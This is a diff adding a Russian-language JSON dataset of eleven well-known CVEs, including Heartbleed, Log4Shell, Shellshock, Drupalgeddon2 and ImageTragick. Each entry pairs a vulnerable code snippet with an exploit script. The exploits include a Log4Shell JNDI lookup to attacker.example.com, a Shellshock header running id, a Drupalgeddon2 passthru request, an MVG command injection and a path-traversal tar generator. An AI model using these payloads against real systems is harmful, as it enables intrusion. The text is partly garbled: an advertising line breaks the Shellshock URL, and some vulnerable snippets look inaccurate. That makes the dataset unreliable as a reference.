@@ -1,0 +1,189 @@
+[
+  {
+    "cve_id": "CVE-2014-0160",
+    "name": "Heartbleed",
+    "short_description": "Неправильная проверка длины в расширении heartbeat OpenSSL позволяет читать память процесса.",
+    "vulnerable_code": {
+      "language": "c",
+      "filename": "ssl/heartbeat.c",
+      "code": "/* ssl/heartbeat.c */\nunsigned char *p = &hbpacket[1];\n/* читаем поле payload (2 байта) */\nunsigned short payload = (p[0] << 8) | p[1];\np += 2;  /* теперь указывает на данные */\n/* BUG: нет проверки payload <= фактической длины hbpacket */\nmemcpy(response + 3, p, payload);\n"
+    },
+    "exploit_example": {
+      "language": "python",
+      "filename": "exploit_heartbleed.py",
+      "code": "# exploit_heartbleed.py\nimport socket, struct\n\ndef make_heartbeat():\n    hb_type = b'\\x01'        # request\n    payload = b'A'           # 1 байт данных\n    length = struct.pack('!H', 0x4000)  # заявляем 0x4000\n    return b'\\x18\\x03\\x02' + struct.pack('!H', len(hb_type+length+payload)) + hb_type + length + payload\n\ns = socket.create_connection(('vulnerable-host', 443))\n# тут должен быть TLS-handshake, пропускаем для краткости\ns.send(make_heartbeat())\ndata = s.recv(8192)\nprint(\"Leaked:\", data.hex()[:100], \"…\")\ns.close()\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": ["OpenSSL", "memory-disclosure", "heartbeat", "bounds-checking"]
+  },
+  {
+    "cve_id": "CVE-2021-44228",
+    "name": "Log4Shell",
+    "short_description": "JNDI-lookup в Log4j2 позволяет выполнить произвольный код через LDAP/RMI.",
+    "vulnerable_code": {
+      "language": "java",
+      "filename": "Example.java",
+      "code": "// Example.java\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\npublic class Example {\n    private static final Logger log = LogManager.getLogger(Example.class);\n\n    public void handleRequest(String userInput) {\n        // уязвимо: в пользовательском вводе может быть ${jndi:...}\n        log.error(\"Request parameter: \" + userInput);\n    }\n}\n"
+    },
+    "exploit_example": {
+      "language": "python",
+      "filename": "exploit_log4shell.py",
+      "code": "# exploit_log4shell.py\nimport requests\n\npayload = \"${jndi:ldap://attacker.example.com:8389/a}\"\nparams = {'name': payload}\nr = requests.get(\"http://vulnerable-app.example.com/\", params=params)\nprint(\"Server response status:\", r.status_code)\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": ["Log4j2", "JNDI", "RCE", "LDAP", "RMI"]
+  },
+  {
+    "cve_id": "CVE-2013-0156",
+    "name": "Rails YAML-десериализация",
+    "short_description": "Rails автоматически десериализует YAML из параметров, что ведёт к RCE.",
+    "vulnerable_code": {
+      "language": "ruby",
+      "filename": "users_controller.rb",
+      "code": "# users_controller.rb\nclass UsersController < ApplicationController\n  def create\n    # небезопасно: незнùтимый YAML из params может содержать объекты Ruby\n    user_data = YAML.load(params[:user_yaml])\n    @user = User.new(user_data)\n    @user.save\n  end\nend\n"
+    },
+    "exploit_example": {
+      "language": "ruby",
+      "filename": "exploit_rails_yaml.rb",
+      "code": "# exploit_rails_yaml.rb\nrequire 'net/http'\n\nmalicious = <<~YAML\n  --- !ruby/object:User\n  name: \"evil\"\n  email: \"evil@example.com\"\n  # в любой момент может быть вызван метод, приведший к выполнению кода\n  init_with: !ruby/object:User\n    foo: !ruby/object:Proc {}\nYAML\n\nuri = URI(\"http://vulnerable-app.local/users\")\nres = Net::HTTP.post_form(uri, 'user_yaml' => malicious)\nputs \"Response: #{res.code}\"\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": ["Ruby on Rails", "YAML", "unsafe-deserialization", "RCE"]
+  },
+  {
+    "cve_id": "CVE-2019-11043",
+    "name": "PHP-FPM + Nginx path_info",
+    "short_description": "Специально сконструированный URL обходил проверки PATH_INFO и вёл к исполнению произвольного кода.",
+    "vulnerable_code": {
+      "language": "nginx",
+      "filename": "nginx.conf (фрагмент)",
+      "code": "location ~ \\.php$ {\n    fastcgi_split_path_info ^(.+\\.php)(/.+)$;\n    fastcgi_pass   127.0.0.1:9000;\n    include        fastcgi_params;\n    fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;\n}\n"
+    },
+    "exploit_example": {
+      "language": "bash",
+      "filename": "exploit_nginx_phpfpm.sh",
+      "code": "#!/bin/bash\n# отправляем почти бесконечную строку „A“ в path_info\nURL=\"http://vuln.local/index.php/$(printf 'A%.0s' {1..10000})/test\"\ncurl -i \"$URL\" -H \"Host: vuln.local\"\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": ["Nginx", "PHP-FPM", "PATH_INFO", "RCE"]
+  },
+  {
+    "cve_id": "CVE-2014-6271",
+    "name": "Shellshock",
+    "short_description": "Bash неправильно обрабатывает функции в переменных окружения, что позволяет выполнить команды.",
+    "vulnerable_code": {
+      "language": "bash",
+      "filename": "cgi-bin/test.sh",
+      "code": "#!/bin/bash\necho \"Content-Type: text/plain\"\necho\n# выполняет bash, читает все переменные окружения, включая HTTP_USER_AGENT\necho \"Agent: $HTTP_USER_AGENT\"\n"
+    },
+    "exploit_example": {
+      "language": "python",
+      "filename": "exploit_shellshock.py",
+      "code": "# exploit_shellshock.py\nimport requests\n\nheaders = {\n    'User-Agent': '() { :; }; echo; /usr/bin/id'\n}\nresp = requests.get('htt\n\n> Chat AI Bot - Chat GPT 5 | Midjourney | Perplexity | Claude:\np://vuln.local/cgi-bin/test.sh', headers=headers)\nprint(resp.text)\n",
+      "note": "Пример без вредоносной нагрузки (в тексте присутствует разорванный URL, сохранён как есть)"
+    },
+    "tags": ["Bash", "environment-variables", "CGI", "RCE"]
+  },
+  {
+    "cve_id": "CVE-2018-7600",
+    "name": "Drupalgeddon2",
+    "short_description": "Неправильная валидация формы в Drupal 7/8 позволяет выполнять произвольные PHP-команды.",
+    "vulnerable_code": {
+      "language": "php",
+      "filename": "Drupal Form API (упрощённо)",
+      "code": "$form['name'] = [\n  '#type' => 'textfield',\n  '#default_value' => $_POST['name'],  // без фильтрации\n];\n"
+    },
+    "exploit_example": {
+      "language": "python",
+      "filename": "exploit_drupalgeddon2.py",
+      "code": "# exploit_drupalgeddon2.py\nimport requests\n\nurl = \"http://vuln-drupal.local/user/register?element_parents=account/mail\"\ndata = {\n  'form_id': 'user_register_form',\n  'mail[#post_render][]': 'passthru',\n  'mail[#type]': 'markup',\n  'mail[#markup]': 'id'\n}\nr = requests.post(url, data=data)\nprint(r.text)\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": ["Drupal", "Form API", "RCE", "input-validation"]
+  },
+  {
+    "cve_id": "CVE-2016-3714",
+    "name": "ImageTragick",
+    "short_description": "ImageMagick при обработке MVG-файлов позволяет выполнить команды ОС.",
+    "vulnerable_code": {
+      "language": "php",
+      "filename": "upload.php",
+      "code": "<?php\n// upload.php\nif ($_FILES['img']['error'] == UPLOAD_ERR_OK) {\n    $tmp = $_FILES['img']['tmp_name'];\n    // небезопасно: команда convert запускается без фильтрации\n    exec(\"convert $tmp output.png\");\n    echo \"Done.\";\n}\n?>\n"
+    },
+    "exploit_example": {
+      "language": "bash",
+      "filename": "evil.mvg",
+      "code": "# evil.mvg\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com\"|id > /tmp/img_tragick.txt|\")'\npop graphic-context\n\n# Загрузить evil.mvg через форму и проверить /tmp/img_tragick.txt.\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": ["ImageMagick", "MVG", "command-injection", "OS-command"]
+  },
+  {
+    "cve_id": "CVE-2016-10033",
+    "name": "PHPMailer header-инъекция",
+    "short_description": "Недостаточная очистка заголовков позволяет вставить в них произвольные команды.",
+    "vulnerable_code": {
+      "language": "php",
+      "filename": "mailer.php",
+      "code": "<?php\nuse PHPMailer\\PHPMailer\\PHPMailer;\n$mail = new PHPMailer();\n$mail->setFrom(\"attacker@example.com\");\n$mail->addAddress(\"victim@example.com\");\n$mail->Subject = \"Test\";\n$mail->Body    = \"Hello\";\n$mail->send();\n?>\n"
+    },
+    "exploit_example": {
+      "language": "php",
+      "filename": "exploit_phpmailer.php",
+      "code": "<?php\n// меняем setFrom, вводим новую строку\n$mail->setFrom(\"attacker@example.com\\r\\nBcc: admin@vuln.local\");\n$mail->send();\necho \"Sent.\";\n?>\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": ["PHPMailer", "header-injection", "email", "input-sanitization"]
+  },
+  {
+    "cve_id": "CVE-2018-15133",
+    "name": "Laravel unsafe unserialize (debug)",
+    "short_description": "При включённом APP_DEBUG Laravel делает unsafe-unserialize куков, что ведёт к выполнению кода.",
+    "vulnerable_code": {
+      "language": "php",
+      "filename": "Http/Middleware/TrustHosts.php (фрагмент, debug=true)",
+      "code": "// в Http/Middleware/TrustHosts.php (debug=true)\nif (config('app.debug')) {\n    $data = unserialize(request()->cookie('laravel_session')); // unsafe\n    // далее работа с $data\n}\n"
+    },
+    "exploit_example": {
+      "language": "python",
+      "filename": "exploit_laravel.py",
+      "code": "# exploit_laravel.py\nimport requests\n# пример произвольного сериализованного объекта\npayload = 'O:8:\"Exception\":0:{}'\ncookies = {'laravel_session': payload}\nr = requests.get('http://vuln-laravel.local/', cookies=cookies)\nprint(\"Status:\", r.status_code)\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": ["Laravel", "unserialize", "cookies", "debug-mode"]
+  },
+  {
+    "cve_id": "CVE-2017-8759",
+    "name": ".NET SOAP-десериализация",
+    "short_description": "Небезопасная десериализация SOAP-форматом позволяет RCE.",
+    "vulnerable_code": {
+      "language": "csharp",
+      "filename": "Service.asmx.cs (фрагмент)",
+      "code": "[WebMethod]\npublic void ProcessData(XmlNode input) {\n    var formatter = new SoapFormatter();\n    using (var ms = new MemoryStream(Encoding.UTF8.GetBytes(input.InnerText))) {\n        // без проверки: десериализуем любое содержимое\n        var obj = formatter.Deserialize(ms);\n    }\n}\n"
+    },
+    "exploit_example": {
+      "language": "csharp",
+      "filename": "exploit_soap.cs",
+      "code": "// exploit_soap.cs\nusing System.Net;\nusing System.Text;\n\nclass Exploit {\n  static void Main() {\n    string soap = @\"\n    <soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>\n      <soap:Body>\n        <ProcessData xmlns='http://tempuri.org/'>\n          <input>\n            <!-- здесь должен быть сериализованный объект -->\n            TVqQAAMAAAAEAAAA//8AALgAAAA...\n          </input>\n        </ProcessData>\n      </soap:Body>\n    </soap:Envelope>\";\n    var wc = new WebClient();\n    wc.Headers.Add(\"Content-Type\",\"text/xml\");\n    var res = wc.UploadString(\"http://vuln-dotnet.local/Service.asmx\", soap);\n    System.Console.WriteLine(res);\n  }\n}\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": [".NET", "SOAP", "unsafe-deserialization", "RCE"]
+  },
+  {
+    "cve_id": "CVE-2020-16033",
+    "name": "archiver path traversal (Go)",
+    "short_description": "Библиотека archiver из Go не фильтрует ../ в путях внутри архива.",
+    "vulnerable_code": {
+      "language": "go",
+      "filename": "main.go (пример использования библиотеки)",
+      "code": "package main\n\nimport (\n  \"github.com/mholt/archiver/v3\"\n)\n\nfunc Unpack(src, dst string) error {\n  // библиотека примет файлы с ../\n  return archiver.Unarchive(src, dst)\n}\n"
+    },
+    "exploit_example": {
+      "language": "go",
+      "filename": "make_evil_tar.go",
+      "code": "// make_evil_tar.go\npackage main\n\nimport (\n  \"archive/tar\"\n  \"os\"\n)\n\nfunc main() {\n  f, _ := os.Create(\"evil.tar\")\n  tw := tar.NewWriter(f)\n  // создаём запись, выходящую из целевой папки\n  hdr := &tar.Header{Name: \"../pwned.txt\", Mode: 0600, Size: 11}\n  tw.WriteHeader(hdr)\n  tw.Write([]byte(\"Hello World\"))\n  tw.Close()\n  f.Close()\n}\n",
+      "note": "Пример без вредоносной нагрузки"
+    },
+    "tags": ["Go", "archiver", "path-traversal", "zip-slip"]
+  }
+]
